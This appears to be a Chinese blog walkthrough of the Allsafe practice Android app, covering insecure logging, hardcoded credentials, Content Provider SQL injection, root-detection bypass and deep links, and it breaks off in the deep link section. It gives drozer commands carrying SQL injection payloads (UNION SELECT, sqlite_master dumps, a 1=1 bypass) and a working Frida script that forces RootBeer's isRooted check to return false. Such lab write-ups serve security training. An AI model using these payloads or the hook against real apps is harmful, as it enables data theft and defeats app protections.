---
title: 【APP测试】allsafe靶场
url: https://mp.weixin.qq.com/s/61EiUVVl21l7nR-NFUq_Hw
source: Doonsec's feed
date: 2026-01-14
fetch_date: 2026-01-15T03:29:00.429928
---

# 【APP测试】allsafe靶场

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/8nIFQgfd1WjWiczs4uFVc7NUMnEPHqbZdwWogfDldLxDLjJ2PFCtKKib2Kslxbu4micMW8QWiajxicslfyVGcLuGeGA/0?wx_fmt=jpeg)

# 【APP测试】allsafe靶场

原创

d0n9x1e

蝉SEC

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WjWiczs4uFVc7NUMnEPHqbZdJ993LUAibIqic0EjYG88icibUKRb5uibLKTTIc4VicZ0Wu9JZ0ojr81j3pQg/640?wx_fmt=png&from=appmsg)

# 0x1 insecure Logging

不安全的日志主要是因为开发的疏忽，将很多信息都打印在日志

如何查看日志

1：adb logcat

2：Android studio

下面是adb logcat的结果

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WjWiczs4uFVc7NUMnEPHqbZdxdtiafTz52BCDQJoRKOksajKhPMKkoziaL0XJUIJgh1u6wXkeLykibRYg/640?wx_fmt=png&from=appmsg)

下面是Android studio的结果

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WjWiczs4uFVc7NUMnEPHqbZduON29EibXgXgmKYDGQ4Y0uKd2nkEFT1QSvEu6ULDsn3ETfn1ibZiaRTMg/640?wx_fmt=png&from=appmsg)

# 0x2 Hardcoded Credentials

硬编码凭据，一般情况下都是在Java层/so层的代码中

拖入jadx分析Java层

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WjWiczs4uFVc7NUMnEPHqbZduvn3N2ia2BZl9UNqKWxYwybDric8hh6dMh7WJ4l9XdpeY5L8kOCzbqVg/640?wx_fmt=png&from=appmsg)

导出为Java格式的源码

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WjWiczs4uFVc7NUMnEPHqbZdjUbsuyictHFGhDaI8zVpQ68qcWS5Ib5otShib6JjPE9FQG9ZczRfuEicg/640?wx_fmt=png&from=appmsg)

敏感文件扫描工具扫一扫

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WjWiczs4uFVc7NUMnEPHqbZd2ZBnSicd4jTsK8SYLOc3nrggcz4dYfrHrMibQ49CEymP3QTa9eibPx6Hg/640?wx_fmt=png&from=appmsg)

可以看到在Java层代码中、配置文件中也是存在着一些敏感信息

# 0x5 SQL Injection

安卓是支持sqllite的，很多时候本地数据的存储都会使用到sqllite

当 Content Provider 中的数据查询采用了 SQL 语句拼接的时候，会出现 SQL 注入漏洞，与 web 中的 SQL 注入并无本质区别。

Content Provider的query( )的方法定义为：

```
public final Cursor query (Uri uri,
                          String[] projection,
                          String selection,
                          String[] selectionArgs,
                          String sortOrder)
```

|  |  |  |  |  |
| --- | --- | --- | --- | --- |
| 参数 | 数据类型 | 必需性 | 作用描述 | 类比SQL语句 |
| `uri` | `Uri` | 是 | **唯一资源标识符**，指定要查询的Content Provider和具体的数据表或路径。 | `FROM table_name` |
| `projection` | `String[]` | 否 | **列投影**，指定返回结果集中包含哪些列。传入`null`则返回所有列。 | `SELECT col1, col2, ...` |
| `selection` | `String` | 否 | **选择条件**，定义筛选哪些行的条件，相当于SQL的WHERE子句（不包含WHERE关键字本身）。 | `WHERE column = value` |
| `selectionArgs` | `String[]` | 否 | **选择参数**，用于安全地替换`selection`字符串中的占位符`?`，防止SQL注入。 | 替换`WHERE column = ?`中的`?` |
| `sortOrder` | `String` | 否 | **排序方式**，指定结果集的排序规则，例如 "name ASC" 或 "date DESC"。 | `ORDER BY column ASC/DESC` |

打开之前扫描敏感信息时扫出来的sql注入特征

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WjWiczs4uFVc7NUMnEPHqbZdouicN2h5ibVA7s0v6LFSoib12daI2ian8hlxt2YcYH6Ziazw2P6zckVvYVw/640?wx_fmt=png&from=appmsg)

去jadx里看一下

infosecadventures.allsafe.challenges.SQLInjection

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WjWiczs4uFVc7NUMnEPHqbZd7iajjKic794648dBV3cUicXTXvnxdzj5BoxDxic61iaTGia01cpzj815mmew/640?wx_fmt=png&from=appmsg)

明显的拼接行为，拿出dorzer进行测试

https://www.yuque.com/pangguanzhe-kpgmo/dv6uk6/kxgpkgst0lov8gzn

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WjWiczs4uFVc7NUMnEPHqbZdzJfkhws3vusEwwYB8xgqwbd3aQq9clyo7k9uWGBxIyicXibxiaVj0gicKw/640?wx_fmt=png&from=appmsg)

```
run scanner.provider.finduris -a infosecadventures.allsafe
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WjWiczs4uFVc7NUMnEPHqbZdoCCJ5g96zywtPB4WkUlNgS0hibMIOyCE1eIhYGHcia0UanB4oUgwyhlw/640?wx_fmt=png&from=appmsg)

查询存在sql注入的uri

```
run scanner.provider.injection -a infosecadventures.allsafe
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WjWiczs4uFVc7NUMnEPHqbZdUOaK1aibWR7q2icdq0BoZGFpevQiad6Lib4ncg8ia5PvmCelFLQA7Zoag2g/640?wx_fmt=png&from=appmsg)

尝试进行sql注入

## 尝试 Projection 注入（列选择注入）

```
# 尝试获取所有表名
dz> run app.provider.query content://infosecadventures.allsafe.dataprovider/ --projection "* FROM sqlite_master WHERE type='table';--"

# 尝试获取特定表结构（如 sqlite_sequence 表）
dz> run app.provider.query content://infosecadventures.allsafe.dataprovider/ --projection "* FROM pragma_table_info('sqlite_sequence');--"

# 尝试直接获取数据
dz> run app.provider.query content://infosecadventures.allsafe.dataprovider/ --projection "* FROM sqlite_sequence;--"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WjWiczs4uFVc7NUMnEPHqbZdXTgcjEUTr0BjZYBYkHvlo5LiaTcPgXCwuQria0iaLtEAGCicO3T43yeERw/640?wx_fmt=png&from=appmsg)

## 尝试 Selection 注入（条件注入）

```
# 绕过认证（永真条件）
dz> run app.provider.query content://infosecadventures.allsafe.dataprovider/ --selection "1=1"

# 获取有多少列
dz> run app.provider.query content://infosecadventures.allsafe.dataprovider/ --selection "1=1) UNION SELECT sqlite_version(),null,null--"

# 尝试获取数据库版本
dz> run app.provider.query content://infosecadventures.allsafe.dataprovider/ --selection "1=1) UNION SELECT sqlite_version(),null,null--"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WjWiczs4uFVc7NUMnEPHqbZdjUp5H5ia94ia0maVMM8NJU9s6eGN6uB1DM78wMSY9HteDTLTm4GCCeQQ/640?wx_fmt=png&from=appmsg)

# 0x7  Root Detection

这关绕过方式有两种

1：刷的root环境足够真实，没有被检测到

2：使用frida hook检测点进行绕过

1：本身没有检测

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/8nIFQgfd1WjWiczs4uFVc7NUMnEPHqbZdOA9NiaoMBQ8UpdjZ865BfMzACdnHicuKcjLnAXuNfCzicqka4CUAMBXYA/640?wx_fmt=jpeg&from=appmsg)

2：hook java层

这里拿模拟器作为案例

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WjWiczs4uFVc7NUMnEPHqbZd8BicjOibFlOFFqyj5GZV8iaoE1EjXHUOrEUkIqicR7cJUK93v2KpveVD3Q/640?wx_fmt=png&from=appmsg)

拖入jadx分析，首先搜索关键字rooted

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WjWiczs4uFVc7NUMnEPHqbZdngl4QeibY18xs12YaYsy80oC0hDgVXQYfibqSDVjvuwIrpUCbo913oQQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WjWiczs4uFVc7NUMnEPHqbZdwLnrJbnDLibF4bhGOuYxvH30DNt1V5E0NT22Dp2iapnjhTGHrVQyvBkg/640?wx_fmt=png&from=appmsg)

点击x交叉调用一下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WjWiczs4uFVc7NUMnEPHqbZdIeIdSr47bavibLMC6mdbss4zW6AvR4ibCqoMaG26mBknQJOicMpS9vN8w/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WjWiczs4uFVc7NUMnEPHqbZdpm0mUCyWarZQOmtZDRZQWZnfvyQSGTkGRXaRkYQ9RL2GPR0FPmZyhg/640?wx_fmt=png&from=appmsg)

找到这里

可以看到就是这个函数在检测root，hook掉他就可以了

启动frida

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WjWiczs4uFVc7NUMnEPHqbZdeRM5VwZyb9ibmQ4Vtb4TauRbuNxtMZyfzQESfd0bLYicrTFicD0mZfibcA/640?wx_fmt=png&from=appmsg)

编写脚本如下

```
function hookroot(){
    let RootBeer = Java.use("com.scottyab.rootbeer.RootBeer");
    RootBeer["isRooted"].implementation = function () {
        console.log(`RootBeer.isRooted is called`);
        let result = this["isRooted"]();
        console.log(`RootBeer.isRooted result=${result}`);
        return result;
    };
}

function main() {
    Java.perform(function () {
        hookroot();
    });
}

// setImmediate(main);

setTimeout(() => {
  setImmediate(main);
}, 3000);
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WjWiczs4uFVc7NUMnEPHqbZdWFdmLNzX9YiclXSfuw37dQLUp0ibr2vA5n2CdMZ8xia9ibMN21PazfjyBQ/640?wx_fmt=png&from=appmsg)

针对原有的逻辑和该函数的返回值，修改返回值为false即可

```
function hookroot(){
    let RootBeer = Java.use("com.scottyab.rootbeer.RootBeer");
    RootBeer["isRooted"].implementation = function () {
        console.log(`RootBeer.isRooted is called`);
        let result = this["isRooted"]();
        console.log(`RootBeer.isRooted result=${result}`);
        let a = false;
        return a;
    };
}

function main() {
    Java.perform(function () {
        hookroot();
    });
}

// setImmediate(main);

setTimeout(() => {
  setImmediate(main);
}, 3000);
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WjWiczs4uFVc7NUMnEPHqbZdnN9vKZAvIbV82kFW3PXUu9ibqCq4kwicN71ncynH3Aw7BrcGtTS8R6BQ/640?wx_fmt=png&from=appmsg)

# 0x9 Deep Link Exploitation

Android Deep Link（深层链接）是一种特殊的链接协议，主要用于在应用程序之间导航和交互，使用 Deep Link 可以从一个APP跳转到另一个APP中相应的页面，实现APP间的无缝跳转。

举个大家熟悉的例子，浏览器打开知乎时，会提示“打开App”，点击后，如果安装过知乎则会直接跳到应用的对应页面，如果没安装则跳转到下载应用页。

## 应用场景

* **一键跳转：**

  在应用内部或应用外部直接跳转到指定页面或执行特定操作的功能。
* **传参安装：**

  在应用市场或者推广渠道传递参数，以便在用户安装应用后，应用可以根据传递的参数自动进行初始化或者展示特定页面。
* **分享闭环：**

  在应用内分享一个商品链接，用户点击链接可以直接跳转到商品详情页面。
* **无码邀请：**

  在应用内点击邀请好友的按钮，可以生成一个唯一的邀请链接，并在邀请过程中跳转到应用内的注册页面。
* **渠道追踪：**

  通过deeplink跳转到应用市场，可以记录该用户从哪个推广渠道下载应用，并将该信息传递给应...